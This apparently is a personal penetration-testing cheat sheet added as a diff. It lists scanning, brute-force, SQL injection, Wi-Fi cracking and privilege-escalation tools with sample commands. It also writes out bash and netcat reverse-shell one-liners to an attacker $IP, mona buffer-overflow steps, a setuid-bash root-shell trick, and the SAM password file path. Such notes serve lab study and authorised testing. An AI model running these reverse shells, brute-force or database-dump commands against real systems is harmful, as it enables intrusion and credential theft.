@@ -1,0 +1,189 @@
+discovery
+
+nmap                        - port scan, use --script=vuln,safe to automatically finding some vulnerabilities / -p- for all ports
+	                            nmap scripts in /usr/share/nmap/scripts
+	                            good scan
+	                            sudo nmap -Pn -p- -O -sV -sS -vvv -oA <logname> -e <iname> --script=default,vuln,safe <target>
+
+                                scripts example:
+                                    --script "(default or safe or vuln) and not http-* and not intrusive"
+
+ncat                        - Concatenate and redirect sockets
+nping                       - Network packet generation tool / ping utility
+ndiff                       - utility to compare nmap scan results (hosts coming up or down, ports opening and closing)
+zenmap                      - gui for nmap
+
+rustscan                    - fancy nmap wrapper in rust, -b for batch size, all nmap flags, ex.
+    	                        sudo rustscan -a <host> -r1-65535 -- -O -sV --script default,vuln,safe
+
+enum4linux.pl               - enumerate users, directories, etc on remote hosts
+gobuster                    - web directory brute forcer
+nikto                       - web directory brute forcer
+openvas                     - open vulnerability scanner, browser based
+arachni                     - browser based web scanner
+wfuzz                       - fuzzing tool
+shodan                      - web api based lookup with various informations
+crackmapexec / cme          - multi purpose tool for enumeration and exploitation
+
+----------------------------------------
+access
+
+hydra / xhydra - network brute force (ssh, ftp, smb, http post/auth, etc)
+                 hydra -l <user>|-L <userfile> -p <pass>|-P <passfile> -V -e nsr -I -t <threads> -u -o hydra.log <proto>://<host>:<port>
+setoolkit - social engineering toolkit, fake websites, etc
+BurpSuiteCommunity - web security, catch and alter requests with proxy, replay requests, use sniper module with intruder to alter requests with payloads
+nc - netcat
+pwncat - netcat on steroids
+smbclient //<ip>/<sharename> - access samba server (windows file share), get from smb enum (nmap, enum4linux, etc)
+SecLists - various lists (repositories)
+sqlmap - sql injection checking
+	burp suite intercept request
+	save request to file
+	sqlmap --dump -r requestfile
+	sqlmap --dump-all -r requestfile
+
+----------------------------------------
+post
+
+john / johnny               - password cracking
+hashcat                     - password cracking
+privilege-escalation-awesome-scripts-suite
+                            - linpeas.sh / winpeas.exe/bat, copy to target and execute as user to enumerate interesting privesc oportunities
+                            git@github.com:carlospolop/privilege-escalation-awesome-scripts-suite.git
+linenum                     - another enumeration tool
+beef                        - browser exploitation framework
+dotdotpwn                   - see "PayloadsAllTheThing/Directory Traversal"
+strings                     - find out what programs might call, possibly without absolute path (allows to add own path and execute arbitary code)
+
+----------------------------------------
+wifi/low level networking
+
+wifite - automatic aircrack-ng
+aircrack-ng - sniff wifi psk
+wifipumpkin - fake AP, MITM
+ettercap / ettercap-gui - arp poisoning, mitm
+bully - wps brute force
+
+----------------------------------------
+tools
+
+cyberchef - web based data pipeline (crypto, encoding, etc)
+msfconsole - metasploit framework, fuck yeah, in meterpreter use bash -i to get shell output in console
+hexdump - hexdump terminal, -C flag for pretty output
+cutter - frontend for radare2 decompiler/disassembler
+ida_free - ida disassembler
+okteta - hex editor
+ipython - python interpreter with some advanced features
+wingide - good python ide
+sublime text - text editor, multi ide
+vim - vim
+searchsploit - tool to search local copy of exploit db (https://www.exploit-db.com)
+crypttool 1/2/j - crypto analytics
+
+reverse shells: https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
+bash reverse tcp
+	on victim
+	command "/bin/bash -c '/bin/bash -i >& /dev/tcp/$IP/$PORT 2>&1 0>&1'"
+    or
+    /bin/sh | nc $IP $PORT
+
+	on attacker
+	pwncat.sh -l -p $PORT
+		pwncat> enum -s -e  - enumerates target (run on local)
+
+man, whatis, whereis, type (command) - information about command
+python -m http.server <port>
+jq - pretty print json
+/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 600
+/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 600 -q <rev EIP>
+immunity debugger plugin mona - https://github.com/corelan/mona
+	paste to C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands
+	!mona config -set workingfolder c:\mona\%p
+
+	find distance to unique pattern (msf pattern_create) in EIP
+	!mona findmsp -distance 600
+
+	find jump point with the address not containing any of the bad chars indicated
+	!mona jmp -r esp -cpb "\x00\x0a\x0d"
+	!mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\x0a\x0d"
+
+	create byte array with badchars indicated and compare with address (cstring-array)
+	!mona bytearray 256 -b "\x00\xff"
+	!mona compare -f C:/mona/%p/bytearray.bin -a <address>
+
+msfvenom - generate payload
+iptraf - watch network trafic
+iftop  - watch network trafic
+nethogs - watch network trafic, also displays process
+subnetcalc - subnet calculator
+grab -A<N> - grab N lines after initial find
+cmatrix - because why the fuck not
+
+----------------------------------------
+references
+
+PayloadsAllTheThings/Methodology and Resources
+                                - reference for a myridad of ways to have bind/reverse tcp in different languages and processes (nc, powershell, python, etc)
+                                git@github.com:swisskyrepo/PayloadsAllTheThings.git
+Pentest-Cheatsheets             - git@github.com:Tib3rius/Pentest-Cheatsheets.git
+
+
+https://book.hacktricks.xyz/
+https://gtfobins.github.io - information on how to exploit binaries for PE with different methods
+
+wildcard injection - bash (tar cf archive.tar *)
+https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
+shodan - web api based database on open ports and vulnerabilities
+
+
+----------------------------------------
+how tows
+
+python virtual environments
+
+create environment
+	virtualenv [-p python_bin] name
+
+creates directory with name
+	source name/bin/activate
+sets up the environment to be used
+deactivate stops the environment from being used
+
+use pip / python / etc will install everything there
+
+
+
+python update system wheels
+sudo -H pip install --update PKGNAME
+
+
+
+setuid on /bin/bash
+invoke with -p flag to get root shell
+
+
+
+unbuffer
+in front of command will make it think it outputs to interactive even though it outputs to pipe
+this preserves formatting
+
+
+
+sudoers.d can have files. hostname = (username) command
+allows command to be excuted as username from hostname
+sudo allows to specify hostname with -h flag
+
+
+
+python webrequest
+import requests
+data = {"name":"value", ...}
+r = requests.post(url, data)
+print(r)
+print(r.text)
+
+
+
+windows passwords in
+C:/windows/system32/config/sam
